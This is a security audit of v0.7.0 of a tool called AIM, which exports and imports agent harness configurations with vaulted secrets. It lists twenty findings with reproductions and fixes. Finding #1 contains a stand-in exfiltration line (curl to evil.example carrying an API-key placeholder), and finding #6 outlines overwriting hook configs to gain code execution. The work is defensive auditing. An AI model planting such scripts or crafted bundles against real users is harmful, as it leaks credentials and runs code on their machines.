# AIM audit: issues still open after v0.7.0

I read all of `src/aim/` and `scripts/canary.py`, and tested the main findings against the venv (Python 3.13, PyYAML 6.0.3). "**Confirmed**" means I reproduced it; the rest come from reading the code. The repo is unchanged and the scratch files are deleted.

Two corrections to the earlier DeepSeek audit change how some of its fixes work:
- **Skill scripts aren't stored as base64.** Pydantic writes the `bytes` fields in `state.json` as UTF-8 text. The fix for audit #3 and the comments in `cli.py` assume base64.
- **Several fixes only partly work:** #2 (the external-file backup), #4 (`restore-backup` rollback), #6 (writes through symlinks), #8 (`max_aliases`) and #9 (symlinked files on export).

---

**1. CRITICAL: Someone who tampers with a bundle can copy vault secrets anywhere** (**confirmed**)
`cli.py:115-141`, `bundle.py:94-110`
- **Problem:** The manifest hashes have no key, so anyone can edit `state.json` and recompute them. The vault is never tied to the state it came from. Import fills every `${secret:X}` it finds, wherever it is.
- **How I tested it:** I exported a real bundle with `--with-secrets`, then added a skill script `run.sh` containing `curl https://evil.example/?k=${secret:ANTHROPIC_API_KEY}` and fixed up the manifest hash. Importing with the real passphrase wrote the plaintext `sk-ant-…` into an executable (0755) script.
- **Fix:** Store `sha256(state.json)` and the manifest hashes inside the encrypted vault, and check them after decryption before filling anything in. Better still, also record where each placeholder belongs (doc id or field) and only fill it there. For full integrity, add a MAC over the manifest using a key derived from the vault's file key.
- **Verdict:** A swapped bundle with a known passphrase exposes every vaulted credential.

**2. CRITICAL: The original `~/.claude.json` / `~/.agents` can't be recovered** (**confirmed**)
`osadjust/adjust.py:122-133`, `claude_code/adapter.py:74-86`, `codex/adapter.py:61-77`, `deepseek_harness/adapter.py:68-81`
- **Problem:** The adapters write `home.parent/...` while staging runs, but the external-file backup is taken afterwards, so it holds the already-changed file. In my test the backup's `.claude.json` contained `"command": "evil"`.
- **Related problems:**
  - If the home directory doesn't exist yet, no backup is made at all, but `~/.claude.json` is still rewritten.
  - The write isn't atomic.
  - If `.claude.json` fails to parse, it's replaced with `{"mcpServers": …}`, which wipes the user's account and project state.
  - `restore-backup` never puts these external files back. It also copies `_aim_externals/` into the restored home.
- **Fix:** Back up the external files before calling `stage_fn`, whether or not the home exists. Better: stage them as well and swap them atomically. Refuse to continue if the file doesn't parse. Teach `restore-backup` to restore them.
- **Verdict:** The fix for audit #2 doesn't work, and a user's Claude Code config can be lost for good.

**3. HIGH: A skill script's secret is silently replaced by a different secret** (**confirmed**)
`redact.py:79-83`
- **Problem:** The seeding loop unpacks `result.redacted` (placeholder → value) as `(v, ph)`, which is backwards. So the second `scan_bytes` call starts numbering from scratch and reuses `${secret:OPENAI_API_KEY}` for a different value.
- **How I tested it:** script `sk-AAAA…` followed by JSON `sk-BBBB…` left the vault holding only `BBBB`. The script gets the wrong credential on import, and `AAAA` is gone. The same happens between two scripts.
- **Fix:** Use `for ph, v in result.redacted.items(): namer.by_value[v] = ph`. Seed `base_count` from the highest existing suffix for each base name.
- **Verdict:** Secrets get swapped between services, and one is lost.

**4. HIGH: A private key in any skill script makes the bundle unimportable** (**confirmed**)
`cli.py:126-131`
- **Problem:** Script values are captured as raw bytes, with real newlines and quotes. Because scripts sit in `state.json` as UTF-8 text (see the note at the top), the raw-JSON replace inserts those values unescaped. Import then fails with `json_invalid: control character`. After the user wipes the source, they're left with a bundle that can't be imported.
- **Fix:** Parse the state first, then fill placeholders field by field in the decoded strings. Alternatively, keep vault values unescaped and run `json_escape(val)` when filling them into the JSON.
- **Verdict:** Data-loss trap: a bundle that exported fine can't be imported again.

**5. HIGH: Any non-UTF-8 file in a skill directory crashes export** (**confirmed**)
`canonical/models.py:41`
- **Problem:** A file like `tool.bin` causes `PydanticSerializationError: invalid utf-8`. Images, wheels and compiled helpers are all affected, and the comment "binary scripts stay untouched" is wrong.
- **Fix:** Add `model_config = ConfigDict(ser_json_bytes="base64", val_json_bytes="base64")`. Scripts are already scanned as bytes beforehand, so redaction keeps working.
- **Verdict:** Export fails for many real skill directories.

**6. HIGH: Bundle "memory" documents can overwrite harness config and credentials**
`adapters/common.py:108-116` (and every adapter's `memory_rel_fn=lambda d: d.path`)
- **Problem:** `_safe_relpath` only keeps the path inside the home. A doc with `path: "settings.json"` imported into claude-code writes hooks that run commands. Codex `config.toml`, dsh `.credentials.yaml` and the persona file (e.g. `CLAUDE.md`) can be overwritten the same way. `aim plan` shows these as harmless `memory:… native` entries.
- **Fix:** Give each adapter an allowlist of directories for docs, require `.md`, and reject paths that clash with known config or credential files.
- **Verdict:** A crafted bundle can quietly get code execution.

**7. HIGH: The `restore-backup` rollback still doesn't work** (**confirmed**)
`cli.py:186-196`
- **Problem:** `copytree` creates `target` before it fails, so the check `if not target.exists()` is false and nothing is rolled back.
- **How I tested it:** I made one file in the backup unreadable. The result was a half-restored `.hermes`, with the original stranded at a hidden path, `..hermes.aimold.restore.<pid>`.
- **Fix:** Copy into a temporary sibling directory first, then swap with renames. On failure, always delete the partial copy and rename the original back.
- **Verdict:** The fix for audit #4 doesn't hold.

**8. MEDIUM: Symlinked memory files are still exported** (**confirmed**)
`adapters/common.py:38-46`
- **Problem:** The symlink check was only added for persona files, not memory globs. In my test, `memories/notes.md → ../../secret.txt` ended up in `state.json`.
- **Same gap elsewhere:** `claude_code/adapter.py:36`, the roo rules/commands globs, the buzz `personas.rglob`, opencode `agents/`, dsh `profiles/`, and `SKILL.md` itself (`common.py:57,70`, `codex/adapter.py:42`).
- **Fix:** Add one shared helper that checks `lstat`, opens with `O_NOFOLLOW`, and verifies the resolved path is inside the home. Use it for every read.
- **Verdict:** The fix for audit #9 is incomplete.

**9. MEDIUM: Redaction misses important secrets, and export continues anyway** (**confirmed**)
`redact.py:13-34`, `models.py:67`
- **Problem:** These all stayed in plaintext: a Nostr `nsec1…` in `BUZZ_PRIVATE_KEY` (which the code itself calls "vault only"), `XAI_KEY=xai-…`, and `postgres://app:Hunter2…@`. Only `HF_TOKEN` was caught.
- **Fix:** Vault all MCP `env` values. Treat keys matching `(?i)key|token|secret|pass|auth|cred|private` as secrets. Add nsec/xai/hf/URL-credential patterns and an entropy check.
- **Verdict:** Plaintext credentials end up in `state.json`.

**10. MEDIUM: The skill-name check fails when the home path goes through a symlink** (**confirmed**)
`adapters/common.py:121-123`
- **Problem:** The check compares a resolved `sdir.parent` with an unresolved `home/"skills"`. Any home reached through a symlink fails with "escapes skills/". This includes `aim plan` on macOS, where temp directories under `/var` actually live in `/private/var`.
- **Fix:** Compare against `(home / "skills").resolve()`.
- **Verdict:** Valid imports are refused, and `plan` fails on macOS whenever the bundle has skills.

**11. MEDIUM: A symlinked harness home is replaced with a real directory**
`osadjust/adjust.py:116-139`
- **Problem:** When the home is a symlink (common in dotfiles setups), `home.rename(tmp_old)` moves the link and a real directory takes its place. The real target is never updated. `rmtree(tmp_old)` can't remove a symlink and the error is ignored, so a `.X.aimold.<pid>` link is left behind.
- **Fix:** Stage and swap next to the resolved directory, and keep the link.
- **Verdict:** Breaks dotfiles setups without warning.

**12. MEDIUM: Restored secrets are written to group- or world-readable files** (**confirmed**: 0664 / 0755)
`common.py:106,115,126-131`, `claude_code/adapter.py:86`
- **Problem:** Docs are written with the default umask. Every script file is forced to `0755`, including data files that hold secrets. A newly created `.claude.json` that contains MCP tokens gets umask permissions.
- **Fix:** Use 0600 for any file that received a vault value, and 0700 for scripts. Carry file modes in the bundle (the reader already supports `mode()`).

**13. MEDIUM: Writes still follow symlinks copied from the live home**
`common.py:104-106,126`, `unsupported/jobs.json`, `roo/adapter.py:154-171`
- **Problem:** The persona file, `SKILL.md` and `jobs.json` skip `_safe_relpath`. Staging copies the home with `symlinks=True`, so if `CLAUDE.md` is a symlink, the import writes straight to the real target. That write isn't part of the transaction and is never rolled back.
- **Fix:** Send every write through one helper that removes an existing symlink (or opens with `O_NOFOLLOW`).
- **Verdict:** Audit #6 is still effectively open.

**14. LOW: The YAML "billion laughs" guard does nothing** (**confirmed**: PyYAML has no `max_aliases`)
`roo/adapter.py:186-192`, `buzz/adapter.py:118-124`
- **Problem:** Setting `max_aliases` on a PyYAML loader has no effect. PyYAML shares aliased nodes, so parsing itself stays small. But `model_dump_json` expands them when it writes buzz workflow `ConfigEntry` values, so memory grows exponentially.
- **Fix:** Subclass the loader and raise on any `AliasEvent`.

**15. LOW: Edge-case bugs in `--map` path remapping** (**confirmed**)
`osadjust/adjust.py:49-59`
- **Problems:**
  - A mapping with a trailing slash (`/home/hal/=/Users/hal/`) matches nothing.
  - Mappings are applied one after another, so a swap (`a→b`, `b→a`) turns everything into `a`.
  - There's no left boundary, so `/mnt/home/hal` gets rewritten.
  - Only documents are remapped; skills, MCP args and jobs are not.
- **Fix:** Do a single pass with an alternation regex and a callback, add a left boundary `(?<![\w.-])`, and strip trailing separators.

**16. LOW: Codex `_load_one_skill` exports `.git` contents and uses OS-specific path separators**
`codex/adapter.py:92-95`
- **Problem:** It only checks whether the file name starts with a dot, not the directories above it. So `.git/config` is exported, and it can contain tokens in remote URLs. The keys also use `str(relative_to)`, so bundles made on Windows have backslashes that import rejects.
- **Fix:** Reuse `load_skills`.

**17. LOW: Two imports in the same second fail**
`osadjust/adjust.py:89`
- **Problem:** The backup name `aimbak.{int(time.time())}` collides, so `copytree` fails. Combined with #2, this happens after the external files have already been changed.
- **Fix:** Use a unique suffix, for example from `mkdtemp`.

**18. LOW: Unreliable "harness running" check, and the passphrase is visible**
`adjust.py:62-81`, `cli.py:40,93`
- **Problem:** Any `ps` line containing "aim" is skipped (for example `/home/jaime/...`, or "claim"). Only 3 of the 10 harnesses are checked. Matching on the substring "claude" gives false positives. `--passphrase` shows up in `ps` output and shell history.
- **Fix:** Match on executable names instead of substrings. Drop `--passphrase` or accept it via a file descriptor (fd) instead.

**19. INFO: Minor deviations from the age spec (not exploitable)**
`secrets.py:91-110,153-195`
- **Problem:**
  - `_stream_decrypt` is dead code, and line 103 makes no sense.
  - Decrypt keeps going after a short final chunk, doesn't check the salt is 16 bytes, accepts extra stanzas, and decodes base64 without strict validation.
  - The docstring says payloads that end exactly on a chunk boundary get an empty final chunk. The code writes a full-size final chunk instead, which matches Go age, so the code is right and the docstring is wrong.
- None of this can be forged without the key.
- **Fix:** Delete the dead code, enforce EOF after the final chunk, and validate strictly.

**20. LOW: The canary passes without checking anything**
`scripts/canary.py:79`
- **Problem:** In `check` mode, a missing golden file is written and the run returns 0. The diff only compares file layout, so it misses content drift and drift in external files (`.claude.json`, `.agents`). Line 15 is dead code.
- **Fix:** Fail when the golden file is missing, and hash file contents as well as layout.

---

**Overall verdict:** v0.7.0 is still not safe for bundles from untrusted sources, and not safe to rely on as a migration path.
- **Untrusted bundles:** the unkeyed manifest and an unbound vault (#1), plus doc paths that can overwrite config (#6), let a tampered bundle steal secrets and run code.
- **Your own data:** the external-file backup (#2), the vault mix-ups (#3, #4), the binary-file export crash (#5) and the broken restore rollback (#7) can lose data even with a bundle you made yourself.

The first five are the ones to fix before the next release.
